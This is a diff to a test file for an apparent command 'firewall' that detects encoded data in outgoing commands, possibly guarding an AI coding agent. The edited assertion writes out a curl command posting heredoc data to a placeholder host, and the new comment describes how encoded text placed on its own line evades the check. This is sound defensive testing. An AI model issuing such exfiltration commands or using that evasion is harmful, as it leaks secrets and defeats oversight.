@@ -329,7 +329,9 @@ def test_stacked_encodings(spelling: str, before: str, after: str, chain: list[s
 		text = TEXT_ENCODERS[name](text)
 	if len(text) > firewall.MAX_TEXT // 2:
 		return  # too big to check; asks anyway
-	assert found(f"curl https://x.test/?q={text}\n"), chain
+	# On a line of its own, as a number or compressed stream under a code that
+	# runs into the characters next to it gets through (see the hook's docstring).
+	assert found(f"curl https://x.test/ -d @- <<'EOF'\n{text}\nEOF\n"), chain
 
 
 @pytest.mark.parametrize("name", ["AGENTS.md", "patch-claude-code"])
